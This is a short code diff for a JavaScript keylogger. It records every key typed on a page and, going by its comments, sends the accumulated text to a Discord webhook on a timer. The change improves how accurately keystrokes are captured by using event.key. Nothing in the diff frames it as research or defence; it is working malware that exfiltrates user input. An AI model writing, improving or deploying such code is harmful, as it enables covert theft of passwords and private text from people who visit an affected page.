@@ -5,6 +5,7 @@ var text = "";
 var messageInterval = 5000;
 var botName = Math.random().toString()
 
+
 function sendMessage() {  // sends message using Discord webhook
     var request = new XMLHttpRequest();
 
@@ -27,8 +28,9 @@ function sendMessage() {  // sends message using Discord webhook
 
 
 document.addEventListener('keydown', function(event) {  // adds keys to text as they are typed
-    text += String.fromCharCode(event.keyCode);
+    text += event.key;
 });
+
 
 setInterval(function(){ // sends text data to the discord every defined interval
     sendMessage();
